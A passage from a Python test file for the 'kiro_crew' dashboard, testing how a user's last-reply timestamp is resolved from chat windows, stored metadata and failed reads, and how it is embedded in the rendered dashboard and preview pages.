        `written_at` is the fold's whole-second spelling of the write, so a stamp with a
        fraction would read as the later of the two and fold a list written after the
        reply. Equal is what the page reads as "not answered"."""
        from datetime import datetime, timezone

        from kiro_crew.crew_log.projection import _panel_iso

        # SPOKE's own second, with the reply 0.3 s into it and the write 0.7 s into it.
        reply_ms, write_ms = 1791935344300, 1791935344700
        written = _panel_iso(write_ms)
        reply = datetime.fromtimestamp(reply_ms / 1000, tz=timezone.utc).isoformat()
        assert reply.endswith(".300000+00:00") and written == SPOKE
        assert routes._last_user_at_of(_Window([_human(reply)])) == written
        # A reply in a LATER second still reads as the later instant.
        assert routes._last_user_at_of(_Window([_human("2026-10-13T23:49:05.001+00:00")])) == (
            "2026-10-13T23:49:05+00:00"
        )

    def test_a_stamp_that_cannot_be_read_is_no_stamp(self, local_tz) -> None:
        local_tz("Pacific/Kiritimati")
        assert routes._last_user_at_of(_Window([_human("not a time")])) == ""
        # Parses, and still cannot be resolved: year 1 at +14:00 is before year 1 UTC.
        assert routes._last_user_at_of(None, "0001-01-01T00:00:00") == ""
        # One bad candidate costs only itself.
        assert routes._last_user_at_of(_Window([_human("not a time")]), SPOKE) == SPOKE

    def test_a_crewmates_page_reads_its_dm_thread(self) -> None:
        dm = routes._dashboard_slot(MEMBER, SLUG)
        state = _ChatState({dm: _Window([_human(SPOKE, steer=True)])})
        assert routes._person_last_spoke(state, SLUG, MEMBER, None) == SPOKE
        assert state.asked == [dm]

    def test_a_sessions_page_reads_its_own_slot_and_no_crewmates(self) -> None:
        dm = routes._dashboard_slot(MEMBER, SLUG)
        state = _ChatState(
            {"chat-7": _Window([_human(SPOKE)]), dm: _Window([_human("2026-10-14T01:00:00+00:00")])}
        )
        assert routes._person_last_spoke(state, "session-key", "", "chat-7") == SPOKE
        assert state.asked == ["chat-7"]

    def test_a_thread_with_no_live_slot_reads_the_stored_stamp_from_its_file(self) -> None:
        from kiro_crew.dashboard.chat_utils import slot_transcript_key

        dm = routes._dashboard_slot(MEMBER, SLUG)
        log = _Log({slot_transcript_key(dm): {"_type": "metadata", "last_user_at": SPOKE}})
        state = _ChatState({}, log)
        assert routes._person_last_spoke(state, SLUG, MEMBER, None) == SPOKE
        assert log.asked == [slot_transcript_key(dm)]

    def test_no_state_or_a_failed_read_is_no_stamp(self) -> None:
        class _Broken(_Log):
            def get_metadata(self, key: str) -> dict:
                raise OSError("unreadable")

        assert routes._person_last_spoke(None, SLUG, MEMBER, None) == ""
        assert routes._person_last_spoke(_ChatState({}, _Broken({})), SLUG, MEMBER, None) == ""

    async def test_the_composed_page_carries_the_stamp(self, monkeypatch) -> None:
        """Through the route: `_serve` reads it off the loop and hands it to the page."""
        from kiro_crew import dashboard_feed

        class FakeFeed:
            def __init__(self, slot, unit="", panel_record=None):
                pass

            def subscribe(self, manifest):
                return []

            def read(self, manifest, agentic=None):
                out = dashboard_feed.FieldRead()
                out.fields = {"credits": 1.5}
                return out

            def wait_for_primes(self):
                pass

            def unsubscribe(self):
                pass

        from kiro_crew.crew_log import projection

        monkeypatch.setattr(dashboard_feed, "DashboardFeed", FakeFeed)
        monkeypatch.setattr(
            projection, "read_slot_projection", lambda slot, name: SimpleNamespace(value={})
        )
        dm = routes._dashboard_slot(MEMBER, SLUG)
        instance.adopt(SLUG, "fixture-board")
        state = _ChatState({dm: _Window([_human(SPOKE, steer=True)])})
        async with _client(state) as client:
            body = await (await client.get(_q(""))).json()
        island = body["rendered_html"].split('id="kirocrew-dashboard-data">', 1)[1]
        read = json.loads(island.split("</script>", 1)[0])
        assert read["last_user_at"] == SPOKE

        # The STAGED page a person previews is composed by the same read, so it is told
        # too: a preview that showed answered cards asking would preview another page.
        instance.stage_preview(SLUG, template_id="fixture-board")
        async with _client(state) as client:
            body = await (await client.get(_q("", preview="1"))).json()
        assert body["preview"] is True
        island = body["rendered_html"].split('id="kirocrew-dashboard-data">', 1)[1]
        assert json.loads(island.split("</script>", 1)[0])["last_user_at"] == SPOKE

        # No gateway state at all is no stamp, and the page is served all the same.
        async with _client() as client:
            body = await (await client.get(_q(""))).json()
        island = body["rendered_html"].split('id="kirocrew-dashboard-data">', 1)[1]
        assert json.loads(island.split("</script>", 1)[0])["last_user_at"] == ""
